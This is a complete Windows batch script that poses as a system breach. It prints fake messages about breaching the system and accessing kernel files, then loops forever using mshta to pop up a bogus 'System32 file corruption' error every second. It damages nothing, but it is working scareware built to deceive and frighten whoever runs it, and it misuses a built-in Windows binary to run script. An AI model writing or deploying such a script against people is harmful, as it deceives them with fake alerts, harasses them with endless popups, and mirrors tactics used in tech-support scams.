@echo off
title Critical System Alert
color 0c

echo Initializing system breach...
timeout /t 2 >nul
echo Accessing kernel files...
timeout /t 2 >nul
echo Corruption detected!
timeout /t 1 >nul

:loop
mshta "javascript:alert('CRITICAL ERROR 0x800F0906\nSystem32 file corruption detected!');close();"
timeout /t 1 >nul
goto loop
